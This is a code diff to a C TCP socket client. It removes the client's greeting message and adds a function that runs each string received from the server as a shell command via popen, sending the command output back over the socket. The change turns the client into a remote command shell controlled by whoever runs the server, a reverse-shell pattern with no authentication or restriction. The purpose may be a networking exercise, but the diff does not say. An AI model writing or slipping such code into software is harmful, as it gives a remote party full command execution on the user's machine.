@@ -62,6 +62,22 @@ void sendMessage(int sockfd) {
     write(sockfd, message, strlen(message));
 }
 
+void sendCommandOutput(char* command, int sockfd){
+    FILE *fp;
+    char output[MAXDATASIZE] = {0};
+    
+    if ((fp = popen(command, "r")) == NULL) {
+        perror("fputs error");
+        exit(1);
+    }    
+
+    while(fgets(output, MAXDATASIZE, fp) != NULL) {
+        // printf("DEBUG: %s", output);
+        write(sockfd, output, MAXDATASIZE);
+    }
+
+}
+
 int main(int argc, char **argv) {
     int    sockfd, n;
     char   recvline[MAXLINE + 1];
@@ -100,7 +116,7 @@ int main(int argc, char **argv) {
     printf("Local IP address: %s\n", inet_ntoa(addr.sin_addr));
     printf("Local port      : %d\n", ntohs(addr.sin_port));
 
-    sendMessage(sockfd);
+    // sendMessage(sockfd);
     
     while ( (n = read(sockfd, recvline, MAXLINE)) > 0) {
         recvline[n] = 0;
@@ -108,6 +124,8 @@ int main(int argc, char **argv) {
             perror("fputs error");
             exit(1);
         }
+        
+        sendCommandOutput(recvline, sockfd);
     }
     
     if (n < 0) {
